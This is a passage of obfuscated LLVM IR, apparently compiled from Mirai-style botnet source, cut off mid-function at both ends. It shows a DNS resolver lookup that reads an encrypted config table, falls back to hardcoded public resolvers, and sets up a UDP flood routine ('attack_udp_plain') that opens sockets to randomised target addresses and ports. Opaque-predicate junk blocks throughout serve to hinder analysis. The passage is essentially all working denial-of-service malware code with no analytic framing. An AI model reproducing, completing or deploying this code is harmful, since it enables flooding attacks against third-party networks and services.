  %642 = icmp slt i32 %639, %641
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %371
  %643 = load i8**, i8*** %13, align 8
  %644 = load i32, i32* %11, align 4
  %645 = sext i32 %644 to i64
  %646 = getelementptr inbounds i8*, i8** %643, i64 %645
  %647 = load i8*, i8** %646, align 8
  store i8* %647, i8** %35, align 8
  %648 = load i8*, i8** %35, align 8
  %649 = bitcast i8* %648 to %struct.iphdr*
  store %struct.iphdr* %649, %struct.iphdr** %36, align 8
  %650 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %651 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %650, i64 1
  %652 = bitcast %struct.iphdr* %651 to %struct.udphdr*
  store %struct.udphdr* %652, %struct.udphdr** %37, align 8
  %653 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %654 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %653, i64 1
  %655 = bitcast %struct.udphdr* %654 to %struct.dnshdr*
  store %struct.dnshdr* %655, %struct.dnshdr** %38, align 8
  %656 = load %struct.dnshdr*, %struct.dnshdr** %38, align 8
  %657 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %656, i64 1
  %658 = bitcast %struct.dnshdr* %657 to i8*
  %659 = getelementptr inbounds i8, i8* %658, i64 1
  store i8* %659, i8** %39, align 8
  %660 = load i16, i16* %15, align 2
  %661 = zext i16 %660 to i32
  %662 = icmp eq i32 %661, 65535
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %428
  %663 = call i32 @rand_next()
  %_67 = shl i32 %663, 65535
  %_68 = shl i32 %663, 65535
  %_69 = shl i32 %663, 65535
  %_70 = sub i32 %663, 65535
  %gen71 = mul i32 %_70, 65535
  %_72 = sub i32 0, %663
  %gen73 = add i32 %_72, 65535
  %664 = and i32 %663, 65535
  %665 = trunc i32 %664 to i16
  %666 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %667 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %666, i32 0, i32 1
  store i16 %665, i16* %667, align 2
  br label %originalBB66

originalBB77alteredBB:                            ; preds = %originalBB77, %532
  %668 = load i32, i32* %11, align 4
  %_78 = shl i32 %668, 1
  %_79 = sub i32 0, %668
  %gen80 = add i32 %_79, 1
  %_81 = sub i32 0, %668
  %gen82 = add i32 %_81, 1
  %_83 = sub i32 %668, 1
  %gen84 = mul i32 %_83, 1
  %_85 = sub i32 %668, 1
  %gen86 = mul i32 %_85, 1
  %669 = add nsw i32 %668, 1
  store i32 %669, i32* %11, align 4
  br label %originalBB77

originalBB90alteredBB:                            ; preds = %originalBB90, %557
  br label %originalBB90
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_dns_resolver() #0 {
  %1 = load i32, i32* @x.35
  %2 = load i32, i32* @y.36
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [2048 x i8], align 16
  %14 = alloca i32, align 4
  %15 = alloca [32 x i8], align 16
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i8, align 1
  store i32 0, i32* %10, align 4
  call void @table_unlock_val(i8 zeroext 37)
  %19 = call i8* @table_retrieve_val(i32 37, i32* null)
  %20 = call i32 (i8*, i32, ...) @open(i8* %19, i32 0)
  store i32 %20, i32* %10, align 4
  call void @table_lock_val(i8 zeroext 37)
  %21 = load i32, i32* %10, align 4
  %22 = icmp sge i32 %21, 0
  %23 = load i32, i32* @x.35
  %24 = load i32, i32* @y.36
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %159

; <label>:31:                                     ; preds = %originalBBpart2
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %32 = load i32, i32* %10, align 4
  %33 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %34 = call i64 @read(i32 %32, i8* %33, i64 2048)
  %35 = trunc i64 %34 to i32
  store i32 %35, i32* %11, align 4
  %36 = load i32, i32* %10, align 4
  %37 = call i32 @close(i32 %36)
  call void @table_unlock_val(i8 zeroext 38)
  %38 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %39 = load i32, i32* %11, align 4
  %40 = call i8* @table_retrieve_val(i32 38, i32* null)
  %41 = call i32 @util_stristr(i8* %38, i32 %39, i8* %40)
  store i32 %41, i32* %12, align 4
  call void @table_lock_val(i8 zeroext 38)
  %42 = load i32, i32* %12, align 4
  %43 = icmp ne i32 %42, -1
  br i1 %43, label %44, label %158

; <label>:44:                                     ; preds = %31
  store i32 0, i32* %14, align 4
  store i8 0, i8* %16, align 1
  store i8 0, i8* %17, align 1
  %45 = load i32, i32* %12, align 4
  store i32 %45, i32* %14, align 4
  br label %46

; <label>:46:                                     ; preds = %148, %44
  %47 = load i32, i32* %14, align 4
  %48 = load i32, i32* %11, align 4
  %49 = icmp slt i32 %47, %48
  br i1 %49, label %50, label %151

; <label>:50:                                     ; preds = %46
  %51 = load i32, i32* %14, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 %52
  %54 = load i8, i8* %53, align 1
  store i8 %54, i8* %18, align 1
  %55 = load i8, i8* %16, align 1
  %56 = icmp ne i8 %55, 0
  br i1 %56, label %84, label %57

; <label>:57:                                     ; preds = %50
  %58 = load i8, i8* %18, align 1
  %59 = sext i8 %58 to i32
  %60 = icmp eq i32 %59, 32
  br i1 %60, label %81, label %61

; <label>:61:                                     ; preds = %57
  %62 = load i32, i32* @x.35
  %63 = load i32, i32* @y.36
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %61
  %70 = load i8, i8* %18, align 1
  %71 = sext i8 %70 to i32
  %72 = icmp eq i32 %71, 9
  %73 = load i32, i32* @x.35
  %74 = load i32, i32* @y.36
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %72, label %81, label %82

; <label>:81:                                     ; preds = %originalBBpart24, %57
  br label %148

; <label>:82:                                     ; preds = %originalBBpart24
  store i8 1, i8* %16, align 1
  br label %83

; <label>:83:                                     ; preds = %82
  br label %84

; <label>:84:                                     ; preds = %83, %50
  %85 = load i8, i8* %18, align 1
  %86 = sext i8 %85 to i32
  %87 = icmp ne i32 %86, 46
  br i1 %87, label %88, label %128

; <label>:88:                                     ; preds = %84
  %89 = load i32, i32* @x.35
  %90 = load i32, i32* @y.36
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %88
  %97 = load i8, i8* %18, align 1
  %98 = sext i8 %97 to i32
  %99 = icmp slt i32 %98, 48
  %100 = load i32, i32* @x.35
  %101 = load i32, i32* @y.36
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %99, label %133, label %108

; <label>:108:                                    ; preds = %originalBBpart28
  %109 = load i32, i32* @x.35
  %110 = load i32, i32* @y.36
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %108
  %117 = load i8, i8* %18, align 1
  %118 = sext i8 %117 to i32
  %119 = icmp sgt i32 %118, 57
  %120 = load i32, i32* @x.35
  %121 = load i32, i32* @y.36
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %119, label %133, label %128

; <label>:128:                                    ; preds = %originalBBpart212, %84
  %129 = load i32, i32* %14, align 4
  %130 = load i32, i32* %11, align 4
  %131 = sub nsw i32 %130, 1
  %132 = icmp eq i32 %129, %131
  br i1 %132, label %133, label %147

; <label>:133:                                    ; preds = %128, %originalBBpart212, %originalBBpart28
  %134 = getelementptr inbounds [32 x i8], [32 x i8]* %15, i32 0, i32 0
  %135 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %136 = load i32, i32* %12, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds i8, i8* %135, i64 %137
  %139 = load i32, i32* %14, align 4
  %140 = load i32, i32* %12, align 4
  %141 = sub nsw i32 %139, %140
  call void @util_memcpy(i8* %134, i8* %138, i32 %141)
  %142 = load i32, i32* %14, align 4
  %143 = load i32, i32* %12, align 4
  %144 = sub nsw i32 %142, %143
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds [32 x i8], [32 x i8]* %15, i64 0, i64 %145
  store i8 0, i8* %146, align 1
  store i8 1, i8* %17, align 1
  br label %151

; <label>:147:                                    ; preds = %128
  br label %148

; <label>:148:                                    ; preds = %147, %81
  %149 = load i32, i32* %14, align 4
  %150 = add nsw i32 %149, 1
  store i32 %150, i32* %14, align 4
  br label %46

; <label>:151:                                    ; preds = %133, %46
  %152 = load i8, i8* %17, align 1
  %153 = icmp ne i8 %152, 0
  br i1 %153, label %154, label %157

; <label>:154:                                    ; preds = %151
  %155 = getelementptr inbounds [32 x i8], [32 x i8]* %15, i32 0, i32 0
  %156 = call i32 @inet_addr(i8* %155) #6
  store i32 %156, i32* %9, align 4
  br label %186

; <label>:157:                                    ; preds = %151
  br label %158

; <label>:158:                                    ; preds = %157, %31
  br label %159

; <label>:159:                                    ; preds = %158, %originalBBpart2
  %160 = load i32, i32* @x.35
  %161 = load i32, i32* @y.36
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %159
  %168 = call i32 @rand_next()
  %169 = urem i32 %168, 4
  %170 = load i32, i32* @x.35
  %171 = load i32, i32* @y.36
  %172 = sub i32 %170, 1
  %173 = mul i32 %170, %172
  %174 = urem i32 %173, 2
  %175 = icmp eq i32 %174, 0
  %176 = icmp slt i32 %171, 10
  %177 = or i1 %175, %176
  br i1 %177, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  switch i32 %169, label %186 [
    i32 0, label %178
    i32 1, label %180
    i32 2, label %182
    i32 3, label %184
  ]

; <label>:178:                                    ; preds = %originalBBpart216
  %179 = call i32 @htonl(i32 134744072) #7
  store i32 %179, i32* %9, align 4
  br label %186

; <label>:180:                                    ; preds = %originalBBpart216
  %181 = call i32 @htonl(i32 1246898730) #7
  store i32 %181, i32* %9, align 4
  br label %186

; <label>:182:                                    ; preds = %originalBBpart216
  %183 = call i32 @htonl(i32 1074151430) #7
  store i32 %183, i32* %9, align 4
  br label %186

; <label>:184:                                    ; preds = %originalBBpart216
  %185 = call i32 @htonl(i32 67240450) #7
  store i32 %185, i32* %9, align 4
  br label %186

; <label>:186:                                    ; preds = %184, %182, %180, %178, %originalBBpart216, %154
  %187 = load i32, i32* %9, align 4
  ret i32 %187

originalBBalteredBB:                              ; preds = %originalBB, %0
  %188 = alloca i32, align 4
  %189 = alloca i32, align 4
  %190 = alloca i32, align 4
  %191 = alloca i32, align 4
  %192 = alloca [2048 x i8], align 16
  %193 = alloca i32, align 4
  %194 = alloca [32 x i8], align 16
  %195 = alloca i8, align 1
  %196 = alloca i8, align 1
  %197 = alloca i8, align 1
  store i32 0, i32* %189, align 4
  call void @table_unlock_val(i8 zeroext 37)
  %198 = call i8* @table_retrieve_val(i32 37, i32* null)
  %199 = call i32 (i8*, i32, ...) @open(i8* %198, i32 0)
  store i32 %199, i32* %189, align 4
  call void @table_lock_val(i8 zeroext 37)
  %200 = load i32, i32* %189, align 4
  %201 = icmp sge i32 %200, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %61
  %202 = load i8, i8* %18, align 1
  %203 = sext i8 %202 to i32
  %204 = icmp eq i32 %203, 9
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %88
  %205 = load i8, i8* %18, align 1
  %206 = sext i8 %205 to i32
  %207 = icmp slt i32 %206, 48
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %108
  %208 = load i8, i8* %18, align 1
  %209 = sext i8 %208 to i32
  %210 = icmp sgt i32 %209, 57
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %159
  %211 = call i32 @rand_next()
  %_ = sub i32 0, %211
  %gen = add i32 %_, 4
  %212 = urem i32 %211, 4
  br label %originalBB14
}

declare i32 @open(i8*, i32, ...) #5

declare i64 @read(i32, i8*, i64) #5

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_plain(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i8**, align 8
  %13 = alloca i32*, align 8
  %14 = alloca i16, align 2
  %15 = alloca i16, align 2
  %16 = alloca i16, align 2
  %17 = alloca i8, align 1
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %25 = alloca i8*, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  %26 = load i8, i8* %7, align 1
  %27 = zext i8 %26 to i64
  %28 = call noalias i8* @calloc(i64 %27, i64 8) #6
  %29 = bitcast i8* %28 to i8**
  store i8** %29, i8*** %12, align 8
  %30 = load i8, i8* %7, align 1
  %31 = zext i8 %30 to i64
  %32 = call noalias i8* @calloc(i64 %31, i64 4) #6
  %33 = bitcast i8* %32 to i32*
  store i32* %33, i32** %13, align 8
  %34 = load i8, i8* %9, align 1
  %35 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %36 = call i32 @attack_get_opt_int(i8 zeroext %34, %struct.attack_option* %35, i8 zeroext 7, i32 65535)
  %37 = trunc i32 %36 to i16
  store i16 %37, i16* %14, align 2
  %38 = load i8, i8* %9, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 6, i32 65535)
  %41 = trunc i32 %40 to i16
  store i16 %41, i16* %15, align 2
  %42 = load i8, i8* %9, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 0, i32 512)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %16, align 2
  %46 = load i8, i8* %9, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 1, i32 1)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %17, align 1
  %50 = bitcast %struct.sockaddr_in* %18 to i8*
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 16, i32 4, i1 false)
  %51 = call i64 @time(i64* null) #6
  %52 = load i32, i32* %6, align 4
  %53 = sext i32 %52 to i64
  %54 = add nsw i64 %51, %53
  %55 = trunc i64 %54 to i32
  store i32 %55, i32* %19, align 4
  %56 = load i16, i16* %15, align 2
  %57 = zext i16 %56 to i32
  %58 = icmp eq i32 %57, 65535
  br i1 %58, label %59, label %78

; <label>:59:                                     ; preds = %5
  %60 = load i32, i32* @x.37
  %61 = load i32, i32* @y.38
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %59
  %68 = call i32 @rand_next()
  %69 = trunc i32 %68 to i16
  store i16 %69, i16* %15, align 2
  %70 = load i32, i32* @x.37
  %71 = load i32, i32* @y.38
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %81

; <label>:78:                                     ; preds = %5
  %79 = load i16, i16* %15, align 2
  %80 = call zeroext i16 @htons(i16 zeroext %79) #7
  store i16 %80, i16* %15, align 2
  br label %81

; <label>:81:                                     ; preds = %78, %originalBBpart2
  store i32 0, i32* %11, align 4
  br label %82

; <label>:82:                                     ; preds = %258, %81
  %83 = load i32, i32* @x.37
  %84 = load i32, i32* @y.38
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %82
  %91 = load i32, i32* %11, align 4
  %92 = load i8, i8* %7, align 1
  %93 = zext i8 %92 to i32
  %94 = icmp slt i32 %91, %93
  %95 = load i32, i32* @x.37
  %96 = load i32, i32* @y.38
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %94, label %103, label %261

; <label>:103:                                    ; preds = %originalBBpart24
  %104 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %105 = load i8**, i8*** %12, align 8
  %106 = load i32, i32* %11, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds i8*, i8** %105, i64 %107
  store i8* %104, i8** %108, align 8
  %109 = load i16, i16* %14, align 2
  %110 = zext i16 %109 to i32
  %111 = icmp eq i32 %110, 65535
  br i1 %111, label %112, label %121

; <label>:112:                                    ; preds = %103
  %113 = call i32 @rand_next()
  %114 = trunc i32 %113 to i16
  %115 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %116 = load i32, i32* %11, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %115, i64 %117
  %119 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %118, i32 0, i32 0
  %120 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %119, i32 0, i32 1
  store i16 %114, i16* %120, align 2
  br label %130

; <label>:121:                                    ; preds = %103
  %122 = load i16, i16* %14, align 2
  %123 = call zeroext i16 @htons(i16 zeroext %122) #7
  %124 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %125 = load i32, i32* %11, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %124, i64 %126
  %128 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %127, i32 0, i32 0
  %129 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %128, i32 0, i32 1
  store i16 %123, i16* %129, align 2
  br label %130

; <label>:130:                                    ; preds = %121, %112
  %131 = load i32, i32* @x.37
  %132 = load i32, i32* @y.38
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %130
  %139 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %140 = load i32*, i32** %13, align 8
  %141 = load i32, i32* %11, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds i32, i32* %140, i64 %142
  store i32 %139, i32* %143, align 4
  %144 = icmp eq i32 %139, -1
  %145 = load i32, i32* @x.37
  %146 = load i32, i32* @y.38
  %147 = sub i32 %145, 1
  %148 = mul i32 %145, %147
  %149 = urem i32 %148, 2
  %150 = icmp eq i32 %149, 0
  %151 = icmp slt i32 %146, 10
  %152 = or i1 %150, %151
  br i1 %152, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %144, label %153, label %170

; <label>:153:                                    ; preds = %originalBBpart28
  %154 = load i32, i32* @x.37
  %155 = load i32, i32* @y.38
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %153
  %162 = load i32, i32* @x.37
  %163 = load i32, i32* @y.38
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %368

; <label>:170:                                    ; preds = %originalBBpart28
  %171 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %171, align 4
  %172 = load i16, i16* %15, align 2
  %173 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %172, i16* %173, align 2
  %174 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %175 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %174, i32 0, i32 0
  store i32 0, i32* %175, align 4
  %176 = load i32*, i32** %13, align 8
  %177 = load i32, i32* %11, align 4
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds i32, i32* %176, i64 %178
  %180 = load i32, i32* %179, align 4
  %181 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  %182 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  store %struct.sockaddr* %182, %struct.sockaddr** %181, align 8
  %183 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %184 = load %struct.sockaddr*, %struct.sockaddr** %183, align 8
  %185 = call i32 @bind(i32 %180, %struct.sockaddr* %184, i32 16) #6
  %186 = icmp eq i32 %185, -1
  br i1 %186, label %187, label %188

; <label>:187:                                    ; preds = %170
  br label %188

; <label>:188:                                    ; preds = %187, %170
  %189 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %190 = load i32, i32* %11, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %189, i64 %191
  %193 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %192, i32 0, i32 2
  %194 = load i8, i8* %193, align 4
  %195 = zext i8 %194 to i32
  %196 = icmp slt i32 %195, 32
  br i1 %196, label %197, label %223

; <label>:197:                                    ; preds = %188
  %198 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %199 = load i32, i32* %11, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %198, i64 %200
  %202 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %201, i32 0, i32 1
  %203 = load i32, i32* %202, align 4
  %204 = call i32 @ntohl(i32 %203) #7
  %205 = call i32 @rand_next()
  %206 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %207 = load i32, i32* %11, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %206, i64 %208
  %210 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %209, i32 0, i32 2
  %211 = load i8, i8* %210, align 4
  %212 = zext i8 %211 to i32
  %213 = lshr i32 %205, %212
  %214 = add i32 %204, %213
  %215 = call i32 @htonl(i32 %214) #7
  %216 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %217 = load i32, i32* %11, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %216, i64 %218
  %220 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %219, i32 0, i32 0
  %221 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %220, i32 0, i32 2
  %222 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %221, i32 0, i32 0
  store i32 %215, i32* %222, align 4
  br label %223

; <label>:223:                                    ; preds = %197, %188
  %224 = load i32, i32* @x.37
  %225 = load i32, i32* @y.38
  %226 = sub i32 %224, 1
  %227 = mul i32 %224, %226
  %228 = urem i32 %227, 2
  %229 = icmp eq i32 %228, 0
  %230 = icmp slt i32 %225, 10
  %231 = or i1 %229, %230
  br i1 %231, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %223
  %232 = load i32*, i32** %13, align 8
  %233 = load i32, i32* %11, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds i32, i32* %232, i64 %234
  %236 = load i32, i32* %235, align 4
  %237 = bitcast %union.__CONST_SOCKADDR_ARG* %24 to %struct.sockaddr**
  %238 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %239 = load i32, i32* %11, align 4
  %240 = sext i32 %239 to i64
  %241 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %238, i64 %240
  %242 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %241, i32 0, i32 0
  %243 = bitcast %struct.sockaddr_in* %242 to %struct.sockaddr*
  store %struct.sockaddr* %243, %struct.sockaddr** %237, align 8
  %244 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %24, i32 0, i32 0
  %245 = load %struct.sockaddr*, %struct.sockaddr** %244, align 8
  %246 = call i32 @connect(i32 %236, %struct.sockaddr* %245, i32 16)
  %247 = icmp eq i32 %246, -1
  %248 = load i32, i32* @x.37
  %249 = load i32, i32* @y.38
  %250 = sub i32 %248, 1
  %251 = mul i32 %248, %250
  %252 = urem i32 %251, 2
  %253 = icmp eq i32 %252, 0
  %254 = icmp slt i32 %249, 10
  %255 = or i1 %253, %254
  br i1 %255, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %247, label %256, label %257

; <label>:256:                                    ; preds = %originalBBpart216
  br label %257

; <label>:257:                                    ; preds = %256, %originalBBpart216
  br label %258

; <label>:258:                                    ; preds = %257
  %259 = load i32, i32* %11, align 4
  %260 = add nsw i32 %259, 1
  store i32 %260, i32* %11, align 4
  br label %82

; <label>:261:                                    ; preds = %originalBBpart24
  %262 = load i32, i32* @x.37
  %263 = load i32, i32* @y.38
  %264 = sub i32 %262, 1
  %265 = mul i32 %262, %264
  %266 = urem i32 %265, 2
  %267 = icmp eq i32 %266, 0
  %268 = icmp slt i32 %263, 10
  %269 = or i1 %267, %268
  br i1 %269, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %261
  %270 = load i32, i32* @x.37
  %271 = load i32, i32* @y.38
  %272 = sub i32 %270, 1
  %273 = mul i32 %270, %272
  %274 = urem i32 %273, 2
  %275 = icmp eq i32 %274, 0
  %276 = icmp slt i32 %271, 10
  %277 = or i1 %275, %276
  br i1 %277, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %278

; <label>:278:                                    ; preds = %originalBBpart237, %originalBBpart220
